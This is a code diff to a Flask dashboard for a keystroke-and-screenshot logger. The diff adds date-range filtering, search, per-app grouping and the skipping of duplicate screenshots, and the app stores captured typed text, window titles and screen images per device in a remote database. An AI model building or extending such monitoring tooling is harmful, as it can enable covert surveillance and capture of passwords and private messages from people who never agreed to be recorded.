@@ -113,6 +113,33 @@ last_screenshot_time = datetime.now()
 # Initialize Flask App
 app = Flask(__name__)
 
+# Thumbnail-based duplicate screenshot detection to save space
+last_screenshot_thumbnail = None
+
+def is_screenshot_redundant(current_img):
+    global last_screenshot_thumbnail
+    try:
+        # Resize to a tiny 16x16 grayscale thumbnail
+        thumb = current_img.resize((16, 16)).convert("L")
+        if last_screenshot_thumbnail is None:
+            last_screenshot_thumbnail = thumb
+            return False
+        
+        # Calculate sum of absolute pixel differences
+        p1 = list(thumb.getdata())
+        p2 = list(last_screenshot_thumbnail.getdata())
+        diff = sum(abs(p1[i] - p2[i]) for i in range(len(p1)))
+        normalized_diff = diff / len(p1)
+        
+        # If average difference per pixel is < 5.0 gray levels, they are virtually identical
+        if normalized_diff < 5.0:
+            return True
+            
+        last_screenshot_thumbnail = thumb
+        return False
+    except Exception:
+        return False
+
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -589,8 +616,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     <button id="toggle-monitor-btn" onclick="toggleDeviceMonitoring()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem; margin-left: 0.25rem;" title="Pause/Resume Monitoring">Pause Logs</button>
                 </div>
                 <div class="date-selector-wrapper">
-                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Date:</span>
-                    <select id="date-select" class="date-select" onchange="changeDate(this.value)"></select>
+                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Start Date:</span>
+                    <input type="date" id="start-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
+                </div>
+                <div class="date-selector-wrapper">
+                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">End Date:</span>
+                    <input type="date" id="end-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
                 </div>
                 <div class="date-selector-wrapper">
                     <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Sort:</span>
@@ -609,6 +640,17 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('logs-tab', this)">Keystroke Logs</button>
             <button class="tab-btn" onclick="switchTab('screenshots-tab', this)">Screenshots</button>
+        </div>
+        
+        <div class="filter-bar" style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1.5rem; background-color: var(--bg-card); border: 1px solid var(--border); padding: 0.75rem 1rem; border-radius: 8px; flex-wrap: wrap;">
+            <div style="flex: 1; min-width: 250px; display: flex; align-items: center; gap: 0.5rem; background-color: var(--bg-main); border: 1px solid var(--border); padding: 0.4rem 0.75rem; border-radius: 6px;">
+                <svg style="width:16px;height:16px;color:var(--text-muted);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                <input type="text" id="search-input" oninput="applyFilters()" placeholder="Search logs, app window titles..." style="background:none; border:none; outline:none; color:var(--text-main); width:100%; font-size:0.9rem;">
+            </div>
+            <label style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--text-muted); cursor: pointer; user-select: none;">
+                <input type="checkbox" id="group-checkbox" onchange="applyFilters()" style="cursor: pointer; accent-color: var(--accent); width:16px; height:16px;">
+                Group by App
+            </label>
         </div>
         
         <div id="logs-tab" class="tab-content active">
@@ -652,10 +694,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     
     <script>
         let currentTab = localStorage.getItem('currentTab') || 'logs-tab';
-        let selectedDate = localStorage.getItem('selectedDate') || '';
+        let startDate = localStorage.getItem('startDate') || new Date().toISOString().split('T')[0];
+        let endDate = localStorage.getItem('endDate') || new Date().toISOString().split('T')[0];
         let selectedSort = localStorage.getItem('selectedSort') || 'asc';
         let selectedDevice = localStorage.getItem('selectedDevice') || '';
         let allDevices = [];
+        let allLogs = [];
+        let allScreenshots = [];
         
         // Track selected items across updates
         let selectedLogKeys = new Set(); // format: "timestamp||text"
@@ -810,10 +855,8 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
             updateMonitoringButton();
-            fetchDates().then(() => {
-                fetchLogs();
-                fetchScreenshots();
-            });
+            fetchLogs();
+            fetchScreenshots();
         }
         
         async function promptRenameDevice() {
@@ -840,41 +883,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
         }
         
-        async function fetchDates() {
-            try {
-                const res = await fetch(`/api/dates?device_id=${selectedDevice}`);
-                const dates = await res.json();
-                const select = document.getElementById('date-select');
-                
-                const prevSelection = localStorage.getItem('selectedDate') || select.value || selectedDate;
-                
-                select.innerHTML = '';
-                dates.forEach(date => {
-                    const option = document.createElement('option');
-                    option.value = date;
-                    option.innerText = date;
-                    select.appendChild(option);
-                });
-                
-                if (dates.length > 0) {
-                    if (dates.includes(prevSelection)) {
-                        selectedDate = prevSelection;
-                    } else {
-                        selectedDate = dates[0];
-                    }
-                    select.value = selectedDate;
-                    localStorage.setItem('selectedDate', selectedDate);
-                } else {
-                    selectedDate = '';
-                }
-            } catch (err) {
-                console.error("Error fetching dates:", err);
-            }
-        }
-        
-        function changeDate(date) {
-            selectedDate = date;
-            localStorage.setItem('selectedDate', date);
+        function changeDateRange() {
+            startDate = document.getElementById('start-date-input').value;
+            endDate = document.getElementById('end-date-input').value;
+            localStorage.setItem('startDate', startDate);
+            localStorage.setItem('endDate', endDate);
+            
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
             fetchLogs();
@@ -882,122 +896,209 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         
         async function fetchLogs() {
-            if (!selectedDate) {
-                document.getElementById('logs-list').innerHTML = '<div class="no-data">No logs found for this date/device.</div>';
+            if (!startDate || !endDate) {
+                document.getElementById('logs-list').innerHTML = '<div class="no-data">No logs found for this date range/device.</div>';
                 document.getElementById('logs-action-bar').style.display = 'none';
                 return;
             }
             try {
-                const res = await fetch(`/api/logs?date=${selectedDate}&device_id=${selectedDevice}`);
+                const res = await fetch(`/api/logs?start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                 const data = await res.json();
-                const container = document.getElementById('logs-list');
-                
-                const actionBar = document.getElementById('logs-action-bar');
-                if (data.length > 0) {
-                    actionBar.style.display = 'flex';
-                } else {
-                    actionBar.style.display = 'none';
-                    container.innerHTML = '<div class="no-data">No activity logs found.</div>';
-                    return;
-                }
-                
-                let html = '';
-                let displayData = [...data];
-                if (selectedSort === 'desc') {
-                    displayData.reverse();
-                }
-                
-                displayData.forEach(log => {
-                    let screenshotLink = '';
-                    if (log.screenshot) {
-                        screenshotLink = `<span class="log-screenshot-link" onclick="openImage('${log.screenshot}')">
-                            <svg style="width:14px;height:14px;display:inline-block;vertical-align:text-bottom;margin-right:2px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                            View Screenshot
-                        </span>`;
-                    }
-                    
-                    const escapedText = log.text.replace(/'/g, "\\'").replace(/"/g, "&quot;");
-                    const key = `${log.timestamp}||${escapedText}`;
-                    const isChecked = selectedLogKeys.has(key) ? 'checked' : '';
-                    
-                    html += `
-                        <div class="log-card">
-                            <div class="log-meta">
-                                <div class="checkbox-container">
-                                    <input type="checkbox" class="card-checkbox log-item-checkbox" data-timestamp="${log.timestamp}" data-text="${escapedText}" ${isChecked} onchange="updateLogSelection()">
-                                </div>
-                                <span class="log-time">${log.timestamp}</span>
-                                <span class="log-window" title="${log.window}">${log.window}</span>
-                                <button class="delete-icon-btn" onclick="deleteLog('${log.timestamp}', '${escapedText}')" title="Delete Log Entry">
-                                    &times; Delete
-                                </button>
-                            </div>
-                            <div class="log-text" style="padding-left: 2rem;">${escapeHtml(log.text)}</div>
-                            ${screenshotLink ? `<div style="margin-top: 0.75rem; padding-left: 2rem;">${screenshotLink}</div>` : ''}
-                        </div>
-                    `;
-                });
-                
-                container.innerHTML = html;
-                updateLogSelection();
+                allLogs = data;
+                applyFilters();
             } catch (err) {
                 console.error("Error fetching logs:", err);
             }
         }
         
         async function fetchScreenshots() {
-            if (!selectedDate) {
-                document.getElementById('screenshots-grid').innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found for this date/device.</div>';
+            if (!startDate || !endDate) {
+                document.getElementById('screenshots-grid').innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found for this date range/device.</div>';
                 document.getElementById('screenshots-action-bar').style.display = 'none';
                 return;
             }
             try {
-                const res = await fetch(`/api/screenshots?date=${selectedDate}&device_id=${selectedDevice}`);
+                const res = await fetch(`/api/screenshots?start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                 const data = await res.json();
-                const container = document.getElementById('screenshots-grid');
+                allScreenshots = data;
+                applyFilters();
+            } catch (err) {
+                console.error("Error fetching screenshots:", err);
+            }
+        }
+        
+        function getAppName(windowTitle) {
+            if (!windowTitle) return "Unknown Application";
+            const parts = windowTitle.split(" - ");
+            if (parts.length > 1) {
+                return parts[parts.length - 1].trim();
+            }
+            return windowTitle;
+        }
+        
+        function applyFilters() {
+            const query = document.getElementById('search-input').value.toLowerCase().trim();
+            const groupChecked = document.getElementById('group-checkbox').checked;
+            
+            let filteredLogs = allLogs.filter(log => {
+                const textMatch = log.text && log.text.toLowerCase().includes(query);
+                const windowMatch = log.window && log.window.toLowerCase().includes(query);
+                const appMatch = log.window && getAppName(log.window).toLowerCase().includes(query);
+                return !query || textMatch || windowMatch || appMatch;
+            });
+            
+            let filteredScreenshots = allScreenshots.filter(img => {
+                const windowMatch = img.window && img.window.toLowerCase().includes(query);
+                const appMatch = img.window && getAppName(img.window).toLowerCase().includes(query);
+                return !query || windowMatch || appMatch;
+            });
+            
+            renderLogs(filteredLogs, groupChecked);
+            renderScreenshots(filteredScreenshots);
+        }
+        
+        function renderLogs(logsList, groupChecked) {
+            const container = document.getElementById('logs-list');
+            const actionBar = document.getElementById('logs-action-bar');
+            
+            if (logsList.length > 0) {
+                actionBar.style.display = 'flex';
+            } else {
+                actionBar.style.display = 'none';
+                container.innerHTML = '<div class="no-data">No activity logs found.</div>';
+                return;
+            }
+            
+            let displayData = [...logsList];
+            if (selectedSort === 'desc') {
+                displayData.reverse();
+            }
+            
+            let html = '';
+            
+            if (groupChecked) {
+                const groups = {};
+                displayData.forEach(log => {
+                    const app = getAppName(log.window);
+                    if (!groups[app]) groups[app] = [];
+                    groups[app].push(log);
+                });
                 
-                const actionBar = document.getElementById('screenshots-action-bar');
-                if (data.length > 0) {
-                    actionBar.style.display = 'flex';
-                } else {
-                    actionBar.style.display = 'none';
-                    container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found.</div>';
-                    return;
-                }
-                
-                let html = '';
-                let displayData = [...data];
-                if (selectedSort === 'desc') {
-                    displayData.reverse();
-                }
-                
-                displayData.forEach(img => {
-                    const isChecked = selectedScreenshotFilenames.has(img.filename) ? 'checked' : '';
+                Object.keys(groups).forEach(app => {
+                    const appLogs = groups[app];
+                    html += `
+                        <div class="app-group" style="margin-bottom: 1.5rem; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; background-color: var(--bg-card);">
+                            <div class="app-group-header" onclick="toggleGroupCollapse(this)" style="display: flex; justify-content: space-between; align-items: center; background-color: rgba(99, 102, 241, 0.08); padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; user-select: none;">
+                                <span style="font-weight: 600; color: #818cf8; font-size: 0.95rem;">${escapeHtml(app)} (${appLogs.length} Entries)</span>
+                                <svg style="width:14px;height:14px;transition: transform 0.2s; transform: rotate(90deg);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                            </div>
+                            <div class="app-group-body" style="display: block;">
+                    `;
+                    
+                    appLogs.forEach(log => {
+                        html += getLogCardHtml(log);
+                    });
                     
                     html += `
-                        <div class="screenshot-card" onclick="openImage('${img.url}', '${img.filename}')">
-                            <div class="screenshot-checkbox-wrapper" onclick="event.stopPropagation();">
-                                <input type="checkbox" class="card-checkbox screenshot-item-checkbox" data-filename="${img.filename}" ${isChecked} onchange="updateScreenshotSelection()">
-                            </div>
-                            <div class="img-container">
-                                <img src="${img.url}" loading="lazy" alt="Screenshot">
-                            </div>
-                            <div class="screenshot-info">
-                                <div class="screenshot-window" title="${img.window}">${img.window}</div>
-                                <div class="screenshot-time">${img.time}</div>
-                                <button class="delete-btn" onclick="event.stopPropagation(); deleteScreenshot('${img.filename}')">
-                                    Delete Image
-                                </button>
                             </div>
                         </div>
                     `;
                 });
-                
-                container.innerHTML = html;
-                updateScreenshotSelection();
-            } catch (err) {
-                console.error("Error fetching screenshots:", err);
+            } else {
+                displayData.forEach(log => {
+                    html += getLogCardHtml(log);
+                });
             }
+            
+            container.innerHTML = html;
+            updateLogSelection();
+        }
+        
+        function toggleGroupCollapse(header) {
+            const body = header.nextElementSibling;
+            const icon = header.querySelector('svg');
+            if (body.style.display === 'none') {
+                body.style.display = 'block';
+                icon.style.transform = 'rotate(90deg)';
+            } else {
+                body.style.display = 'none';
+                icon.style.transform = 'rotate(0deg)';
+            }
+        }
+        
+        function getLogCardHtml(log) {
+            let screenshotLink = '';
+            if (log.screenshot) {
+                screenshotLink = `<span class="log-screenshot-link" onclick="openImage('${log.screenshot}')">
+                    <svg style="width:14px;height:14px;display:inline-block;vertical-align:text-bottom;margin-right:2px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                    View Screenshot
+                </span>`;
+            }
+            
+            const escapedText = log.text.replace(/'/g, "\\'").replace(/"/g, "&quot;");
+            const key = `${log.timestamp}||${escapedText}`;
+            const isChecked = selectedLogKeys.has(key) ? 'checked' : '';
+            
+            return `
+                <div class="log-card">
+                    <div class="log-meta">
+                        <div class="checkbox-container">
+                            <input type="checkbox" class="card-checkbox log-item-checkbox" data-timestamp="${log.timestamp}" data-text="${escapedText}" ${isChecked} onchange="updateLogSelection()">
+                        </div>
+                        <span class="log-time">${log.timestamp}</span>
+                        <span class="log-window" title="${log.window}">${log.window}</span>
+                        <button class="delete-icon-btn" onclick="deleteLog('${log.timestamp}', '${escapedText}')" title="Delete Log Entry">
+                            &times; Delete
+                        </button>
+                    </div>
+                    <div class="log-text" style="padding-left: 2rem;">${escapeHtml(log.text)}</div>
+                    ${screenshotLink ? `<div style="margin-top: 0.75rem; padding-left: 2rem;">${screenshotLink}</div>` : ''}
+                </div>
+            `;
+        }
+        
+        function renderScreenshots(screenshotsList) {
+            const container = document.getElementById('screenshots-grid');
+            const actionBar = document.getElementById('screenshots-action-bar');
+            
+            if (screenshotsList.length > 0) {
+                actionBar.style.display = 'flex';
+            } else {
+                actionBar.style.display = 'none';
+                container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found.</div>';
+                return;
+            }
+            
+            let displayData = [...screenshotsList];
+            if (selectedSort === 'desc') {
+                displayData.reverse();
+            }
+            
+            let html = '';
+            displayData.forEach(img => {
+                const isChecked = selectedScreenshotFilenames.has(img.filename) ? 'checked' : '';
+                
+                html += `
+                    <div class="screenshot-card" onclick="openImage('${img.url}', '${img.filename}')">
+                        <div class="screenshot-checkbox-wrapper" onclick="event.stopPropagation();">
+                            <input type="checkbox" class="card-checkbox screenshot-item-checkbox" data-filename="${img.filename}" ${isChecked} onchange="updateScreenshotSelection()">
+                        </div>
+                        <div class="img-container">
+                            <img src="${img.url}" loading="lazy" alt="Screenshot">
+                        </div>
+                        <div class="screenshot-info">
+                            <div class="screenshot-window" title="${img.window}">${img.window}</div>
+                            <div class="screenshot-time">${img.time}</div>
+                            <button class="delete-btn" onclick="event.stopPropagation(); deleteScreenshot('${img.filename}')">
+                                Delete Image
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+            updateScreenshotSelection();
         }
         
         // Selection handlers for Logs
@@ -1198,11 +1299,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 if (btn) switchTab('screenshots-tab', btn);
             }
             // Restore sort select if it exists in UI
-            const sortSelect = document.querySelector('.sort-select');
+            const sortSelect = document.getElementById('sort-select');
             if (sortSelect) sortSelect.value = selectedSort;
             
+            // Set date inputs
+            document.getElementById('start-date-input').value = startDate;
+            document.getElementById('end-date-input').value = endDate;
+            
             await fetchDevices();
-            await fetchDates();
             fetchLogs();
             fetchScreenshots();
         }
@@ -1219,7 +1323,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         setInterval(() => {
             fetchDevices();
-            fetchDates();
             if (currentTab === 'logs-tab') {
                 fetchScreenshots();
             } else {
@@ -1365,7 +1468,14 @@ def get_available_dates():
 
 @app.route('/api/logs')
 def get_logs():
-    date_str = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+    start_date = request.args.get("start_date")
+    end_date = request.args.get("end_date")
+    
+    if not start_date or not end_date:
+        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+        start_date = single_date
+        end_date = single_date
+        
     device_id = request.args.get("device_id")
     
     # Try querying Supabase
@@ -1373,7 +1483,8 @@ def get_logs():
         try:
             query = supabase.table("activity_logs") \
                 .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename") \
-                .eq("created_date", date_str)
+                .gte("created_date", start_date) \
+                .lte("created_date", end_date)
             
             if device_id:
                 query = query.eq("device_id", device_id)
@@ -1405,11 +1516,18 @@ def get_logs():
             print(f"Failed to query logs from Supabase: {e}")
             
     # Fallback to local files
-    return jsonify(parse_logs(date_str))
+    return jsonify(parse_logs(start_date))
 
 @app.route('/api/screenshots')
 def get_screenshots():
-    date_str = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+    start_date = request.args.get("start_date")
+    end_date = request.args.get("end_date")
+    
+    if not start_date or not end_date:
+        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+        start_date = single_date
+        end_date = single_date
+        
     device_id = request.args.get("device_id")
     
     # Try querying Supabase
@@ -1417,9 +1535,10 @@ def get_screenshots():
         try:
             query = supabase.table("activity_logs") \
                 .select("timestamp, window_title, screenshot_url, screenshot_filename") \
-                .eq("created_date", date_str) \
+                .gte("created_date", start_date) \
+                .lte("created_date", end_date) \
                 .not_.is_("screenshot_url", "null")
-                
+            
             if device_id:
                 query = query.eq("device_id", device_id)
                 
@@ -1449,13 +1568,13 @@ def get_screenshots():
             print(f"Failed to query screenshots from Supabase: {e}")
             
     # Fallback to local files
-    screenshot_dir = os.path.join("screenshots", date_str)
+    screenshot_dir = os.path.join("screenshots", start_date)
     if not os.path.exists(screenshot_dir):
         return jsonify([])
     files = os.listdir(screenshot_dir)
     png_files = sorted([f for f in files if f.endswith(".png") or f.endswith(".webp")], reverse=False)
     
-    logs = parse_logs(date_str)
+    logs = parse_logs(start_date)
     screenshot_to_window = {}
     for log_entry in logs:
         if log_entry["screenshot"]:
@@ -1777,7 +1896,18 @@ def capture_and_upload_screenshot(prefix):
             # Fallback to PIL ImageGrab if mss is not available
             screenshot = ImageGrab.grab(all_screens=True)
             
-        screenshot.save(local_path, "WEBP", quality=60)
+        # Omit redundant screenshots if screen has not changed
+        if is_screenshot_redundant(screenshot):
+            return None, None
+            
+        # Scale down to standard 1280px width if larger to save disk space
+        max_width = 1280
+        if screenshot.width > max_width:
+            ratio = max_width / float(screenshot.width)
+            new_height = int(float(screenshot.height) * ratio)
+            screenshot = screenshot.resize((max_width, new_height), Image.Resampling.LANCZOS)
+            
+        screenshot.save(local_path, "WEBP", quality=45)
     except Exception as e:
         print(f"Failed to capture or save screenshot: {e}")
         return None, None
